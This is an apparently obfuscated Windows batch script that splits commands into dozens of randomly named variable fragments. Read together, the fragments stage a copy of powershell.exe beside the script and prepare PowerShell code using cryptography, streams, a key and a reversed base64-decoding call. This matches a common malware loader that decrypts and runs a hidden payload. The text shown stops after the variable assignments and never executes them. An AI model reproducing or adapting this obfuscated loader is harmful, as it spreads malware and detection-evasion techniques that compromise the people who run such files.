@echo off
set "kbFQIAbsaO=\v"
set "HKJMqpMssL=we"
set "ayCwoRnxoC=y "
set "CVmttKngWD= C"
set "YdHoakGuae=Po"
set "gVhajuwSWI=Sy"
set "BxbpolQfkw=rS"
set "ScwLqASKge=s\"
set "uBkDfNOoTh=1."
set "OzWMXrVHZs=ow"
set "sWsGerHLUv=em"
set "lYISHJfqEV=st"
set "MNFMpSrWDD=32"
set "hwIKRDADQM=0\"
set "cQUtmXWlds=po"
set "NUgdJNtVYf=rs"
set "RXWyyBiZkQ=ll"
set "QikfYiJRKy=.e"
set "jccBnoDrZW=Wi"
set "vCgkMkDBWR=in"
set "RClAzxNVtB=ll"
set "IVakTlJFDm= /"
set "ZBcLTJcJBL=he"
set "lZAncCCLhz=py"
set "ayCnLDHRrh=he"
set "uexlVFyLRw=nd"
set "MKXBVysWCO=do"
set "yTdSnJKzov=:\"
set "UdKqhUtEdG=\W"
set "BKfkgbGTqv=co"
set "sjMbaplbzk=ws"
set "DanXsjhvbM=xe"
set "pQaMQkfjvJ=we"
set "luNahZtjRe=cd"
set "GbAQACnpQI= %~dp0"
set "sSEESbXafI='gni"
set "VauKHIpnCC=.Con"
set "CMrgsEDKzs=).Sp"
set "pWUtZCkKmr=gsYZ"
set "iYnRdKtSVJ=-Obj"
set "netFKqnYyP=OoPJ"
set "vbhSLdrSqo=::De"
set "AdgENtoNBW=;$OS"
set "gdJbApHFZd=[-1."
set "SHTFzyAKNE=P = "
set "QVEFxqKdZw=;$WP"
set "OZTwvliwfw=]::("
set "KgNyYyQKDi=y = "
set "kLVlCAaTSe=;$ne"
set "tiqvMSKKNQ= New"
set "qeKsraQURY=ct S"
set "RKuLfBMqxu='')("
set "CwyEehaQAi=nirt"
set "nIeAsIuJIN=Ep ="
set "PGkBcBaFbv=ewLi"
set "jdbpDzvJpK=.Mod"
set "BdBkRThmtp=m.IO"
set "pzuwnAfKkv=ptor"
set "OmAXAlrqxs= '')"
set "hbNWIQdfwH=okRG"
set "WxXmRIDzBH== $y"
set "kmanlOOtLx=$uPK"
set "CtzkUexluM=F'[-"
set "rZAHljAXFq=Obje"
set "HzCRgsPcGk=rity"
set "IyDHslvCKw=.Key"
set "xLxnWMGHkc=);$y"
set "sXbVfAnkDU=raph"
set "jxLpkXZtGI=in $"
set "QFqRdbjDOa=Disp"
set "DFAGCdSxej=nxPr"
set "fkJRczEgvl=();$"
set "tsRRbGwogI=ivz."
set "uQUBxdPXzX=[Env"
set "zWjENVHXKI=  $T"
set "aWEiwWsOnl=okRG"
set "hQhoMRuOzI=V) {"
set "OeZYfcWFAs=Syst"
set "MTvFiBgLio=[IO."
set "WzlqDkAFzJ=okRG"
set "ONrCEmHDDb=Stre"
set "kGAbSkneWg===')"
set "GmqfXYTfkw=l5E7"
